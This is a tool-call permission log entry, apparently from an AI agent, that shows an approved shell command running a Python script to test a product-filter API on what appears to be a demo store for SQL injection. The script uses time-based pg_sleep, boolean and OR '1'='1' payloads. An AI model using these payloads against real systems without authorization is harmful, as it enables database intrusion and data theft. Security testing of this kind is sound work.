{"ts": 1790641470.014852, "decision_id": "85c114503813", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 -c \"\nimport requests\nimport time\n\n# Test filter by color with more SQLi - PostgreSQL\nurl = 'https://duck-store.escape.tech/api/v1/products/filter/by-color'\n\n# Test with proper PostgreSQL sleep\nstart = time.time()\nr = requests.get(url, params={'color': \\\"yellow' AND pg_sleep(2)--\\\"})\nprint(f\\\"pg_sleep(2): {time.time()-start:.2f}s\\\", r.status_code, r.text[:200])\n\n# Test boolean with different syntax\nr = requests.get(url, params={'color': \\\"yellow' AND 1=1--\\\"})\nprint(\\\"AND 1=1--:\\\", r.status_code, r.text[:200])\n\nr = requests.get(url, params={'color': \\\"yellow' AND 1=2--\\\"})\nprint(\\\"AND 1=2--:\\\", r.status_code, r.text[:200])\n\n# Test with quote escape\nr = requests.get(url, params={'color': \\\"yellow' OR '1'='1' --\\\"})\nprint(\\\"OR 1=1--:\\\", r.status_code, r.text[:200])\n\n# Test with different quote\nr = requests.get(url, params={'color': 'yellow'})\nprint(\\\"Yellow (normal):\\\", r.status_code, r.text[:200])\n\n# Test with nothing\nr = requests.get(url, params={'color': \\\"' OR '1'='1\\\"})\nprint(\\\"OR 1=1 (no prefix):\\\", r.status_code, r.text[:200])\n\""}
